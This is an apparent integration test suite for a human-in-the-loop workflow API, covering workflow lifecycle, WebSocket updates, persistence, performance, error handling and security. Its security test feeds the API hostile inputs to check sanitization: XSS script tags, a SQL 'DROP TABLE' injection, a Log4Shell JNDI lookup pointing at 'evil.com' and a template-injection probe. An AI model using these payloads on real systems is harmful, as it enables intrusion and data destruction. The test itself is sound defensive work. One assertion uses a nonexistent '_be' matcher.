import request from 'supertest';
import express from 'express';
import { createTestApp } from '../../helpers/test-app.js';
import { TestDatabase } from '../../helpers/test-database.js';
import { MockLangGraphOrchestrator } from '../../helpers/mock-orchestrator.js';

describe('HITL Workflow Integration Tests', () => {
  let app: express.Application;
  let testDb: TestDatabase;
  let mockOrchestrator: MockLangGraphOrchestrator;
  let server: any;

  beforeAll(async () => {
    testDb = new TestDatabase();
    await testDb.initialize();

    mockOrchestrator = new MockLangGraphOrchestrator();
    app = await createTestApp(testDb, mockOrchestrator);

    server = app.listen(0); // Random port
  });

  afterAll(async () => {
    await server.close();
    await testDb.cleanup();
  });

  beforeEach(async () => {
    await testDb.clear();
    mockOrchestrator.reset();
  });

  describe('Workflow Lifecycle Integration', () => {
    it('should complete a full HITL workflow cycle', async () => {
      // 1. Initialize workflow
      const initResponse = await request(app)
        .post('/api/workflows')
        .send({
          name: 'data-analysis-workflow',
          description: 'Analyze sales data with human approval',
          steps: [
            { id: 'collect', name: 'Collect Data', type: 'automated' },
            { id: 'analyze', name: 'Analyze Data', type: 'automated' },
            { id: 'review', name: 'Human Review', type: 'hitl' },
            { id: 'approve', name: 'Final Approval', type: 'hitl' }
          ],
          config: {
            timeoutMs: 300000,
            retryAttempts: 3
          }
        });

      expect(initResponse.status).toBe(201);
      const workflowId = initResponse.body.id;

      // 2. Start workflow execution
      const startResponse = await request(app)
        .post(`/api/workflows/${workflowId}/start`)
        .send({
          inputData: {
            dataSource: 'sales-db',
            dateRange: '2024-01-01:2024-03-31'
          }
        });

      expect(startResponse.status).toBe(200);
      expect(startResponse.body.status).toBe('running');

      // 3. Progress through automated steps
      await new Promise(resolve => setTimeout(resolve, 100)); // Allow async processing

      const statusResponse = await request(app)
        .get(`/api/workflows/${workflowId}/status`);

      expect(statusResponse.body.status).toBe('paused');
      expect(statusResponse.body.currentStep).toBe('review');
      expect(statusResponse.body.requiresHumanInput).toBe(true);

      // 4. Get UI for human interaction
      const uiResponse = await request(app)
        .get(`/api/workflows/${workflowId}/ui`);

      expect(uiResponse.status).toBe(200);
      expect(uiResponse.body).toHaveProperty('uiComponent');
      expect(uiResponse.body.uiComponent.type).toBe('review-dashboard');

      // 5. Submit human feedback
      const feedbackResponse = await request(app)
        .post(`/api/workflows/${workflowId}/feedback`)
        .send({
          step: 'review',
          action: 'approve',
          feedback: 'Analysis looks good, recommendations are relevant',
          approvedBy: 'test-user',
          timestamp: Date.now()
        });

      expect(feedbackResponse.status).toBe(200);
      expect(feedbackResponse.body.status).toBe('running');

      // 6. Continue to final approval
      await new Promise(resolve => setTimeout(resolve, 100));

      const finalStatusResponse = await request(app)
        .get(`/api/workflows/${workflowId}/status`);

      expect(finalStatusResponse.body.status).toBe('completed');
      expect(finalStatusResponse.body.results).toBeDefined();
    });

    it('should handle workflow rejection and restart', async () => {
      // Initialize workflow
      const initResponse = await request(app)
        .post('/api/workflows')
        .send({
          name: 'rejection-test-workflow',
          steps: [
            { id: 'analyze', name: 'Analyze', type: 'automated' },
            { id: 'review', name: 'Review', type: 'hitl' }
          ]
        });

      const workflowId = initResponse.body.id;

      // Start workflow
      await request(app).post(`/api/workflows/${workflowId}/start`);
      await new Promise(resolve => setTimeout(resolve, 100));

      // Reject at review step
      const rejectResponse = await request(app)
        .post(`/api/workflows/${workflowId}/feedback`)
        .send({
          step: 'review',
          action: 'reject',
          feedback: 'Analysis methodology needs revision',
          restartFrom: 'analyze',
          rejectedBy: 'test-user'
        });

      expect(rejectResponse.status)._be(200);
      expect(rejectResponse.body.status).toBe('running');
      expect(rejectResponse.body.currentStep).toBe('analyze');
      expect(rejectResponse.body.rejectionCount).toBe(1);
    });

    it('should handle concurrent workflows independently', async () => {
      const workflows = [];

      // Create multiple workflows
      for (let i = 0; i < 5; i++) {
        const response = await request(app)
          .post('/api/workflows')
          .send({
            name: `concurrent-workflow-${i}`,
            steps: [
              { id: `step-${i}-1`, name: 'Step 1', type: 'automated' },
              { id: `step-${i}-2`, name: 'Step 2', type: 'hitl' }
            ]
          });

        workflows.push(response.body.id);

        // Start each workflow
        await request(app).post(`/api/workflows/${response.body.id}/start`);
      }

      await new Promise(resolve => setTimeout(resolve, 200));

      // Check all workflows are running/paused independently
      for (const workflowId of workflows) {
        const statusResponse = await request(app)
          .get(`/api/workflows/${workflowId}/status`);

        expect(['running', 'paused']).toContain(statusResponse.body.status);
        expect(statusResponse.body.id).toBe(workflowId);
      }
    });
  });

  describe('Real-time Communication Integration', () => {
    it('should handle WebSocket connections for live updates', async () => {
      const WebSocket = require('ws');
      const ws = new WebSocket(`ws://localhost:${server.address().port}/ws/workflows`);

      const messagePromise = new Promise((resolve) => {
        ws.on('message', (data) => {
          resolve(JSON.parse(data.toString()));
        });
      });

      // Start a workflow to trigger updates
      const initResponse = await request(app)
        .post('/api/workflows')
        .send({
          name: 'websocket-test-workflow',
          steps: [
            { id: 'step1', name: 'Step 1', type: 'automated' },
            { id: 'step2', name: 'Step 2', type: 'automated' }
          ]
        });

      await request(app).post(`/api/workflows/${initResponse.body.id}/start`);

      // Wait for WebSocket message
      const message = await messagePromise;

      expect(message).toHaveProperty('type');
      expect(message).toHaveProperty('workflowId');
      expect(message.workflowId).toBe(initResponse.body.id);

      ws.close();
    });

    it('should broadcast UI updates to all connected clients', async () => {
      const WebSocket = require('ws');
      const clients = Array(3).fill(null).map(() =>
        new WebSocket(`ws://localhost:${server.address().port}/ws/workflows`)
      );

      const messages = clients.map(() =>
        new Promise((resolve) => {
          clients[clients.length - 1].on('message', (data) => {
            resolve(JSON.parse(data.toString()));
          });
        })
      );

      // Create workflow and trigger UI update
      const initResponse = await request(app)
        .post('/api/workflows')
        .send({
          name: 'broadcast-test-workflow',
          steps: [{ id: 'ui-update', name: 'UI Update', type: 'hitl' }]
        });

      await request(app).post(`/api/workflows/${initResponse.body.id}/start`);
      await new Promise(resolve => setTimeout(resolve, 100));

      // All clients should receive the update
      const results = await Promise.all(messages);

      results.forEach(message => {
        expect(message.type).toBe('workflow_update');
        expect(message.workflowId).toBe(initResponse.body.id);
      });

      clients.forEach(client => client.close());
    });
  });

  describe('Database Integration', () => {
    it('should persist workflow state correctly', async () => {
      const initResponse = await request(app)
        .post('/api/workflows')
        .send({
          name: 'persistence-test-workflow',
          steps: [
            { id: 'step1', name: 'Step 1', type: 'automated' },
            { id: 'step2', name: 'Step 2', type: 'hitl' }
          ]
        });

      const workflowId = initResponse.body.id;

      // Start and progress workflow
      await request(app).post(`/api/workflows/${workflowId}/start`);
      await new Promise(resolve => setTimeout(resolve, 100));

      // Verify database persistence
      const dbState = await testDb.getWorkflowState(workflowId);
      expect(dbState).toBeDefined();
      expect(dbState.id).toBe(workflowId);
      expect(dbState.status).toBe('paused');
      expect(dbState.currentStep).toBe('step2');

      // Simulate server restart by creating new app instance
      const newApp = await createTestApp(testDb, mockOrchestrator);

      // Verify workflow can be resumed
      const resumeResponse = await request(newApp)
        .post(`/api/workflows/${workflowId}/feedback`)
        .send({
          step: 'step2',
          action: 'approve',
          feedback: 'Resume after restart',
          approvedBy: 'test-user'
        });

      expect(resumeResponse.status).toBe(200);
      expect(resumeResponse.body.status).toBe('completed');
    });

    it('should handle database connection failures gracefully', async () => {
      // Simulate database failure
      await testDb.disconnect();

      const response = await request(app)
        .post('/api/workflows')
        .send({
          name: 'db-failure-test',
          steps: [{ id: 'step1', name: 'Step 1', type: 'automated' }]
        });

      expect(response.status).toBe(503);
      expect(response.body.error).toContain('Database unavailable');

      // Reconnect for other tests
      await testDb.reconnect();
    });
  });

  describe('Performance Integration', () => {
    it('should handle high-volume workflow requests', async () => {
      const requestCount = 50;
      const requests = Array(requestCount).fill(null).map((_, i) =>
        request(app)
          .post('/api/workflows')
          .send({
            name: `perf-test-${i}`,
            steps: [{ id: 'step1', name: 'Step 1', type: 'automated' }]
          })
      );

      const startTime = performance.now();
      const responses = await Promise.all(requests);
      const endTime = performance.now();

      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(201);
      });

      // Should complete within reasonable time (< 5 seconds)
      expect(endTime - startTime).toBeLessThan(5000);

      // Calculate throughput
      const requestsPerSecond = requestCount / ((endTime - startTime) / 1000);
      expect(requestsPerSecond).toBeGreaterThan(10); // At least 10 req/sec
    });

    it('should maintain UI generation performance under load', async () => {
      const workflowId = (await request(app)
        .post('/api/workflows')
        .send({
          name: 'ui-performance-test',
          steps: [
            { id: 'generate-ui', name: 'Generate UI', type: 'hitl' }
          ]
        })).body.id;

      await request(app).post(`/api/workflows/${workflowId}/start`);
      await new Promise(resolve => setTimeout(resolve, 100));

      const startTime = performance.now();

      const uiResponse = await request(app)
        .get(`/api/workflows/${workflowId}/ui`);

      const endTime = performance.now();

      expect(uiResponse.status).toBe(200);
      expect(uiResponse.body.uiComponent).toBeDefined();

      // UI generation should be fast (< 2 seconds as per requirements)
      expect(endTime - startTime).toBeLessThan(2000);
    });
  });

  describe('Error Handling Integration', () => {
    it('should handle malformed requests gracefully', async () => {
      const malformedRequests = [
        { invalid: 'structure' },
        { name: '', steps: [] },
        { name: 'test', steps: 'invalid' },
        { name: 'test', steps: [{ invalidStep: true }] }
      ];

      for (const payload of malformedRequests) {
        const response = await request(app)
          .post('/api/workflows')
          .send(payload);

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      }
    });

    it('should handle workflow timeouts appropriately', async () => {
      const response = await request(app)
        .post('/api/workflows')
        .send({
          name: 'timeout-test-workflow',
          steps: [
            {
              id: 'slow-step',
              name: 'Slow Step',
              type: 'automated',
              timeoutMs: 100 // Very short timeout
            }
          ]
        });

      const workflowId = response.body.id;

      await request(app).post(`/api/workflows/${workflowId}/start`);
      await new Promise(resolve => setTimeout(resolve, 200)); // Wait for timeout

      const statusResponse = await request(app)
        .get(`/api/workflows/${workflowId}/status`);

      expect(statusResponse.body.status).toBe('error');
      expect(statusResponse.body.error).toContain('timeout');
    });

    it('should implement proper error recovery', async () => {
      // Create workflow that will fail
      const workflowId = (await request(app)
        .post('/api/workflows')
        .send({
          name: 'recovery-test-workflow',
          steps: [
            { id: 'failing-step', name: 'Failing Step', type: 'automated' }
          ],
          config: { retryAttempts: 2 }
        })).body.id;

      // Mock step failure
      mockOrchestrator.setStepToFail('failing-step');

      await request(app).post(`/api/workflows/${workflowId}/start`);
      await new Promise(resolve => setTimeout(resolve, 300));

      // Should have attempted retries
      const statusResponse = await request(app)
        .get(`/api/workflows/${workflowId}/status`);

      expect(statusResponse.body.retryCount).toBe(2);
      expect(statusResponse.body.status).toBe('error');

      // Fix the issue and retry
      mockOrchestrator.setStepToSucceed('failing-step');

      const retryResponse = await request(app)
        .post(`/api/workflows/${workflowId}/retry`);

      expect(retryResponse.status).toBe(200);
      expect(retryResponse.body.status).toBe('completed');
    });
  });

  describe('Security Integration', () => {
    it('should validate user permissions for workflow operations', async () => {
      const workflowId = (await request(app)
        .post('/api/workflows')
        .send({
          name: 'security-test-workflow',
          steps: [{ id: 'step1', name: 'Step 1', type: 'automated' }]
        })).body.id;

      // Try to access without authentication
      const unauthorizedResponse = await request(app)
        .delete(`/api/workflows/${workflowId}`)
        .set('Authorization', 'invalid-token');

      expect(unauthorizedResponse.status).toBe(401);

      // Try with valid authentication
      const authorizedResponse = await request(app)
        .delete(`/api/workflows/${workflowId}`)
        .set('Authorization', 'valid-test-token');

      expect(authorizedResponse.status).toBe(200);
    });

    it('should sanitize user inputs to prevent injection attacks', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        "'; DROP TABLE workflows; --",
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '<img src="x" onerror="alert(\'XSS\')">'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/workflows')
          .send({
            name: input,
            description: input,
            steps: [
              {
                id: 'sanitized-step',
                name: input,
                type: 'automated',
                config: { userInput: input }
              }
            ]
          });

        expect(response.status).toBe(201);

        // Verify input was sanitized
        const workflowData = response.body;
        expect(workflowData.name).not.toContain('<script>');
        expect(workflowData.name).not.toContain('DROP TABLE');
        expect(workflowData.description).not.toContain('${jndi:');
      }
    });
  });
});